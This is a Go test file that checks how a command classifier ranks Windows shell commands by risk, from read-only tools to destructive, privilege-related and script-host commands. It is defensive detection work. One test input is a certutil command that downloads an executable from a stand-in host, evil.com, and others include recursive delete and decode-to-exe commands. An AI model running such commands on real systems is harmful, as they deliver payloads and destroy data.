//go:build windows

package shell

import "testing"

func TestClassifyCommand_WindowsCommands(t *testing.T) {
	tests := []struct {
		name  string
		args  []string
		level RiskLevel
	}{
		// Low — read-only
		{"dir", []string{"dir", "/b"}, RiskLow},
		{"where", []string{"where", "git"}, RiskLow},
		{"systeminfo", []string{"systeminfo"}, RiskLow},
		{"tasklist", []string{"tasklist"}, RiskLow},
		{"findstr", []string{"findstr", "pattern", "file.txt"}, RiskLow},
		{"ver", []string{"ver"}, RiskLow},

		// Medium — file modification
		{"copy", []string{"copy", "a.txt", "b.txt"}, RiskMedium},
		{"xcopy", []string{"xcopy", "src", "dst"}, RiskMedium},
		{"robocopy plain", []string{"robocopy", "src", "dst"}, RiskMedium},
		{"move", []string{"move", "a.txt", "b.txt"}, RiskMedium},
		{"ren", []string{"ren", "old.txt", "new.txt"}, RiskMedium},
		{"attrib", []string{"attrib", "+h", "file.txt"}, RiskMedium},
		{"certutil hash", []string{"certutil", "-hashfile", "f.exe"}, RiskMedium},
		{"mklink", []string{"mklink", "link", "target"}, RiskMedium},

		// High — destructive
		{"del", []string{"del", "file.txt"}, RiskHigh},
		{"erase", []string{"erase", "file.txt"}, RiskHigh},
		{"rd", []string{"rd", "folder"}, RiskHigh},
		{"taskkill", []string{"taskkill", "/pid", "1234"}, RiskHigh},
		{"icacls", []string{"icacls", "file", "/grant", "user:F"}, RiskHigh},
		{"takeown", []string{"takeown", "/f", "file"}, RiskHigh},

		// Critical — privilege escalation, system config
		{"runas", []string{"runas", "/user:admin", "cmd"}, RiskCritical},
		{"reg", []string{"reg", "query", "HKLM"}, RiskCritical},
		{"regedit", []string{"regedit", "/s", "file.reg"}, RiskCritical},
		{"bcdedit", []string{"bcdedit", "/set"}, RiskCritical},
		{"net", []string{"net", "user"}, RiskCritical},
		{"sc", []string{"sc", "query"}, RiskCritical},
		{"netsh", []string{"netsh", "advfirewall"}, RiskCritical},
		{"schtasks", []string{"schtasks", "/create"}, RiskCritical},
		{"wmic", []string{"wmic", "process", "list"}, RiskCritical},
		{"msiexec", []string{"msiexec", "/i", "pkg.msi"}, RiskCritical},
		{"dism", []string{"dism", "/online"}, RiskCritical},
		{"sfc", []string{"sfc", "/scannow"}, RiskCritical},

		// Critical — shell wrappers and script hosts
		{"powershell", []string{"powershell", "-Command", "Get-Date"}, RiskCritical},
		{"cmd", []string{"cmd", "/c", "dir"}, RiskCritical},
		{"cmd.exe", []string{"cmd.exe", "/c", "dir"}, RiskCritical},
		{"cscript", []string{"cscript", "script.vbs"}, RiskCritical},
		{"wscript", []string{"wscript", "script.vbs"}, RiskCritical},
		{"mshta", []string{"mshta", "file.hta"}, RiskCritical},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ClassifyCommand(tt.args, nil)
			if got != tt.level {
				t.Errorf("ClassifyCommand(%v) = %s, want %s", tt.args, got, tt.level)
			}
		})
	}
}

func TestClassifyCommand_WindowsArgModifiers(t *testing.T) {
	tests := []struct {
		name string
		args []string
		want RiskLevel
	}{
		{"robocopy /MIR", []string{"robocopy", "src", "dst", "/MIR"}, RiskHigh},
		{"robocopy /PURGE", []string{"robocopy", "src", "dst", "/PURGE"}, RiskHigh},
		{"certutil -urlcache", []string{"certutil", "-urlcache", "-split", "-f", "http://evil.com/a.exe"}, RiskHigh},
		{"certutil -decode", []string{"certutil", "-decode", "in.b64", "out.exe"}, RiskHigh},
		{"del /s", []string{"del", "/s", "*.tmp"}, RiskCritical},
		{"del /q", []string{"del", "/q", "*.log"}, RiskCritical},
		{"rd /s", []string{"rd", "/s", "folder"}, RiskCritical},
		{"taskkill /f", []string{"taskkill", "/f", "/pid", "1234"}, RiskCritical},
		{"taskkill /im", []string{"taskkill", "/im", "notepad.exe"}, RiskCritical},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ClassifyCommand(tt.args, nil)
			if got != tt.want {
				t.Errorf("ClassifyCommand(%v) = %s, want %s", tt.args, got, tt.want)
			}
		})
	}
}

func TestClassifyCommand_WindowsShellWrappers(t *testing.T) {
	// powershell, cmd and cmd.exe are Windows-only shell wrappers.
	// pwsh (PowerShell Core) is cross-platform and tested in risk_test.go.
	shells := []string{"powershell", "cmd", "cmd.exe"}
	for _, sh := range shells {
		t.Run(sh, func(t *testing.T) {
			got := ClassifyCommand([]string{sh, "/c", "echo hi"}, nil)
			if got != RiskCritical {
				t.Errorf("%s should be critical, got %s", sh, got)
			}
		})
	}
}
